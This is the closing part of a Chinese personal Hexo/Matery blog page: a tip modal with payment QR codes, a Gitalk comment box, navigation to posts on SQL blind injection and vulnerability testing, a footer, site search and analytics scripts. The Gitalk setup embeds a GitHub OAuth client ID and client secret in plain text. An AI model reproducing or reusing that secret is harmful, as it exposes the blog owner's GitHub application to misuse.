+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'eeb203cbafbf211b9d6b',
+        clientSecret: '54c58335381911e065959f2f3debcb57e3c24629',
+        repo: 'gittalk',
+        owner: 'aspirepigshadow',
+        admin: "aspirepigshadow",
+        id: '2018-11-26T12-28-16',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2018/11/30/sql-mang-zhu-jiao-ben/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="Python SQL盲注脚本">
+                        
+                        <span class="card-title">Python SQL盲注脚本</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2018-11-30
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/python/" class="post-category">
+                                    python
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2018/07/23/lou-dong-yan-zheng-xi-lie/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="漏洞验证系列">
+                        
+                        <span class="card-title">漏洞验证系列</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2018-07-23
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/linux/" class="post-category">
+                                    linux
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <a href="/about" target="_blank">Aspirepig</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;Total Words:&nbsp;<span
+                        class="white-color">36.4k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;Total visitors:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/AspirePig" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?f22d47f7e2eff37039f9e60a3d9c9940";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
